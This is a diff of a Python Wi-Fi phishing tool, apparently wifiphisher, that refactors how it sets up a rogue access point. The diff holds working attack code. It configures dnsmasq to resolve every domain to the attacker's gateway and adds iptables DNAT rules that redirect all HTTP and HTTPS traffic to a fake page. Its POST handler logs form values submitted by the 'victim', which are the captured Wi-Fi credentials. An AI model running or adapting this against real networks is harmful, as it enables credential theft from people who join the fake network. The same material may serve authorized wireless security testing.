@@ -25,8 +25,13 @@ conf.verb = 0
 PORT = 8080
 SSL_PORT = 443
 PEM = 'cert/server.pem'
-PHISING_PAGE = "access-point-pages/minimal"
+PHISING_PAGE = "phishing-scenarios/minimal"
 POST_VALUE_PREFIX = "wfphshr"
+NETWORK_IP = "10.0.0.0"
+NETWORK_MASK = "255.255.255.0"
+NETWORK_GW_IP = "10.0.0.1"
+DHCP_LEASE = "10.0.0.2,10.0.0.100,12h"
+
 DN = open(os.devnull, 'w')
 
 # Console colors
@@ -43,6 +48,7 @@ T = '\033[93m'   # tan
 count = 0  # for channel hopping Thread
 APs = {}  # for listing APs
 hop_daemon_running = True
+terminate = False
 lock = Lock()
 
 
@@ -177,7 +183,7 @@ class SecureHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
 
     def do_GET(self):
         self.send_response(301)
-        self.send_header('Location', 'http://10.0.0.1:' + str(PORT))
+        self.send_header('Location', 'http://' + NETWORK_GW_IP + ':' + str(PORT))
         self.end_headers()
 
     def log_message(self, format, *args):
@@ -244,6 +250,8 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
             SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
 
     def do_POST(self):
+        global terminate
+        redirect = False
         form = cgi.FieldStorage(
             fp=self.rfile,
             headers=self.headers,
@@ -254,7 +262,7 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
             return
         for item in form.list:
             if item.name and item.value and POST_VALUE_PREFIX in item.name:
-                self.redirect("/upgrading.html")
+                redirect = True
                 wifi_webserver_tmp = "/tmp/wifiphisher-webserver.tmp"
                 with open(wifi_webserver_tmp, "a+") as log_file:
                     log_file.write('[' + T + '*' + W + '] ' + O + "POST " +
@@ -263,7 +271,10 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
                                    W + "\n"
                                    )
                     log_file.close()
-                return       
+        if redirect == True:
+            self.redirect("/upgrading.html")
+            terminate = True
+            return
         self.redirect()
 
     def log_message(self, format, *args):
@@ -364,30 +375,6 @@ def get_internet_interface():
         res = [''.join(i) for i in zip(x, x)]
         d = [str(int(i, 16)) for i in res]
         return inet_iface
-    return False
-
-
-def get_internet_ip_prefix():
-    '''return the wifi internet connected IP prefix'''
-    ipprefix = None
-    if os.path.isfile("/sbin/ip") == True:
-        proc = Popen(['/sbin/ip', 'route'], stdout=PIPE, stderr=DN)
-        def_route = proc.communicate()[0].split('\n')  # [0].split()
-        for line in def_route:
-            if 'wlan' in line and 'default via' in line:
-                line = line.split()
-                inet_iface = line[4]
-                ipprefix = line[2][:2]  # Just checking if it's 192, 172, or 10
-                return ipprefix
-    else:
-        proc = open('/proc/net/route', 'r')
-        default = proc.readlines()[1]
-        if "wlan" in default:
-            def_route = default.split()[0]
-        x = iter(default.split()[2])
-        res = [''.join(i) for i in zip(x, x)]
-        d = [str(int(i, 16)) for i in res]
-        return ipprefix
     return False
 
 
@@ -500,64 +487,44 @@ def start_ap(mon_iface, channel, essid, args):
     try:
         time.sleep(6)  # Copied from Pwnstar which said it was necessary?
     except KeyboardInterrupt:
-        cleanup(None, None)
+        shutdown()
 
 
 def dhcp_conf(interface):
 
     config = (
-        # disables dnsmasq reading any other files like
-        # /etc/resolv.conf for nameservers
         'no-resolv\n'
-        # Interface to bind to
         'interface=%s\n'
-        # Specify starting_range,end_range,lease_time
         'dhcp-range=%s\n'
-        'address=/#/10.0.0.1'
+        'address=/#/%s'
     )
 
-    ipprefix = get_internet_ip_prefix()
-    if ipprefix == '19' or ipprefix == '17' or not ipprefix:
-        with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
-            # subnet, range, router, dns
-            dhcpconf.write(config % (interface, '10.0.0.2,10.0.0.100,12h'))
-    elif ipprefix == '10':
-        with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
-            dhcpconf.write(config % (interface, '172.16.0.2,172.16.0.100,12h'))
+    with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
+        dhcpconf.write(config % (interface, DHCP_LEASE, NETWORK_GW_IP))
     return '/tmp/dhcpd.conf'
 
 
 def dhcp(dhcpconf, mon_iface):
     os.system('echo > /var/lib/misc/dnsmasq.leases')
     dhcp = Popen(['dnsmasq', '-C', dhcpconf], stdout=PIPE, stderr=DN)
-    ipprefix = get_internet_ip_prefix()
     Popen(['ifconfig', str(mon_iface), 'mtu', '1400'], stdout=DN, stderr=DN)
-    if ipprefix == '19' or ipprefix == '17' or not ipprefix:
-        Popen(
-            ['ifconfig', str(mon_iface), 'up', '10.0.0.1',
-             'netmask', '255.255.255.0'
-             ],
-            stdout=DN,
-            stderr=DN
-        )
-        time.sleep(.5) # Give it some time to avoid "SIOCADDRT: Network is unreachable"
-        os.system(
-            ('route add -net 10.0.0.0 netmask ' +
-             '255.255.255.0 gw 10.0.0.1')
-        )
-    else:
-        Popen(
-            ['ifconfig', str(mon_iface), 'up', '172.16.0.1',
-             'netmask', '255.255.255.0'
-             ],
-            stdout=DN,
-            stderr=DN
-        )
-        time.sleep(.5) # Give it some time to avoid "SIOCADDRT: Network is unreachable"
-        os.system(
-            ('route add -net 172.16.0.0 netmask ' +
-             '255.255.255.0 gw 172.16.0.1')
-        )
+    Popen(
+        ['ifconfig', str(mon_iface), 'up', NETWORK_GW_IP,
+         'netmask', NETWORK_MASK
+         ],
+        stdout=DN,
+        stderr=DN
+    )
+    # Make sure that we have set the network properly.
+    proc = check_output(['ifconfig', str(mon_iface)])
+    if NETWORK_GW_IP not in proc:
+        return False
+    time.sleep(.5) # Give it some time to avoid "SIOCADDRT: Network is unreachable"
+    os.system(
+        ('route add -net %s netmask %s gw %s' % 
+        (NETWORK_IP, NETWORK_MASK, NETWORK_GW_IP))
+    )
+    return True
 
 
 def get_strongest_iface(exceptions=[]):
@@ -593,6 +560,7 @@ def start_mode(interface, mode="monitor"):
 
 
 # Wifi Jammer stuff
+# TODO: Merge this with the other channel_hop method.
 def channel_hop2(mon_iface):
     '''
     First time it runs through the channels it stays on each channel for
@@ -889,6 +857,16 @@ def get_hostapd():
 
 if __name__ == "__main__":
 
+    print "               _  __ _       _     _     _               "
+    print "              (_)/ _(_)     | |   (_)   | |              "
+    print "     __      ___| |_ _ _ __ | |__  _ ___| |__   ___ _ __ "
+    print "     \ \ /\ / / |  _| | '_ \| '_ \| / __| '_ \ / _ \ '__|"
+    print "      \ V  V /| | | | | |_) | | | | \__ \ | | |  __/ |   "
+    print "       \_/\_/ |_|_| |_| .__/|_| |_|_|___/_| |_|\___|_|   "
+    print "                      | |                                "
+    print "                      |_|                                "
+    print "                                                         "
+
     # Parse args
     args = parse_args()
     # Are you root?
@@ -897,36 +875,9 @@ if __name__ == "__main__":
     # Get hostapd if needed
     get_hostapd()
 
-    # Start HTTP server in a background thread
-    Handler = HTTPRequestHandler
-    try:
-        httpd = HTTPServer(("", PORT), Handler)
-    except socket.error:
-        sys.exit((
-            '\n[' + R + '-' + W + '] Unable to start HTTP server!\n' +
-            '[' + R + '-' + W + '] Another process is running on port ' + str(PORT) + '.\n' +
-            '[' + R + '!' + W + '] Closing'
-        ))
-    print '[' + T + '*' + W + '] Starting HTTP server at port ' + str(PORT)
-    webserver = Thread(target=httpd.serve_forever)
-    webserver.daemon = True
-    webserver.start()
-
-    # Start HTTPS server in a background thread
-    Handler = SecureHTTPRequestHandler
-    try:
-        httpd = SecureHTTPServer(("", SSL_PORT), Handler)
-    except socket.error:
-        sys.exit((
-            '\n[' + R + '-' + W + '] Unable to start HTTPS server!\n' +
-            '[' + R + '-' + W + '] Another process is running on port ' + str(SSL_PORT) + '.\n' +
-            '[' + R + '!' + W + '] Closing'
-        ))
-    print ('[' + T + '*' + W + '] Starting HTTPS server at port ' +
-           str(SSL_PORT))
-    secure_webserver = Thread(target=httpd.serve_forever)
-    secure_webserver.daemon = True
-    secure_webserver.start()
+    # TODO: We should have more checks here:
+    # Is anything binded to our HTTP(S) ports?
+    # Maybe we should save current iptables rules somewhere
 
     # Get interfaces
     reset_interfaces()
@@ -971,12 +922,12 @@ if __name__ == "__main__":
     '''
     # Set iptable rules and kernel variables.
     os.system(
-        ('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT ' +
-         '--to-destination 10.0.0.1:%s' % PORT)
+        ('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination %s:%s' 
+        % (NETWORK_GW_IP, PORT))
     )
     os.system(
-        ('iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT ' +
-         '--to-destination 10.0.0.1:%s' % SSL_PORT)
+        ('iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination %s:%s' 
+        % (NETWORK_GW_IP, SSL_PORT))
     )
     Popen(
         ['sysctl', '-w', 'net.ipv4.conf.all.route_localnet=1'],
@@ -998,16 +949,53 @@ if __name__ == "__main__":
     # Start AP
     start_ap(ap_iface, channel, essid, args)
     dhcpconf = dhcp_conf(ap_iface)
-    dhcp(dhcpconf, ap_iface) 
+    if not dhcp(dhcpconf, ap_iface):
+        print('[' + G + '+' + W + 
+            '] Could not set IP address on %s!' % ap_iface)
+        shutdown()
     os.system('clear')
     print ('[' + T + '*' + W + '] ' + T +
            essid + W + ' set up on channel ' +
            T + channel + W + ' via ' + T + mon_iface +
            W + ' on ' + T + str(ap_iface) + W)
 
+    # With configured DHCP, we may now start the web server
+    # Start HTTP server in a background thread
+    Handler = HTTPRequestHandler
+    try:
+        httpd = HTTPServer((NETWORK_GW_IP, PORT), Handler)
+    except socket.error, v:
+        errno = v[0]
+        sys.exit((
+            '\n[' + R + '-' + W + '] Unable to start HTTP server (socket errno ' + str(errno) + ')!\n' +
+            '[' + R + '-' + W + '] Maybe another process is running on port ' + str(PORT) + '?\n' +
+            '[' + R + '!' + W + '] Closing'
+        ))
+    print '[' + T + '*' + W + '] Starting HTTP server at port ' + str(PORT)
+    webserver = Thread(target=httpd.serve_forever)
+    webserver.daemon = True
+    webserver.start()
+    # Start HTTPS server in a background thread
+    Handler = SecureHTTPRequestHandler
+    try:
+        httpd = SecureHTTPServer((NETWORK_GW_IP, SSL_PORT), Handler)
+    except socket.error, v:
+        errno = v[0]
+        sys.exit((
+            '\n[' + R + '-' + W + '] Unable to start HTTPS server (socket errno ' + str(errno) + ')!\n' +
+            '[' + R + '-' + W + '] Maybe another process is running on port ' + str(SSL_PORT) + '?\n' +
+            '[' + R + '!' + W + '] Closing'
+        ))
+    print ('[' + T + '*' + W + '] Starting HTTPS server at port ' +
+           str(SSL_PORT))
+    secure_webserver = Thread(target=httpd.serve_forever)
+    secure_webserver.daemon = True
+    secure_webserver.start()
+
+    time.sleep(3)
+
     clients_APs = []
     APs = []
-    args = parse_args()
     args.accesspoint = ap_mac
     args.channel = channel
     monitor_on = None
@@ -1059,10 +1047,9 @@ if __name__ == "__main__":
                 lines = ["\n"] * 5
             for l in lines:
                 print l
-                # We got a victim. Shutdown everything.
-                if POST_VALUE_PREFIX in l:
-                    time.sleep(2)
-                    shutdown()
+            if terminate:
+                time.sleep(3)
+                shutdown()
             time.sleep(0.5)
     except KeyboardInterrupt:
         shutdown()
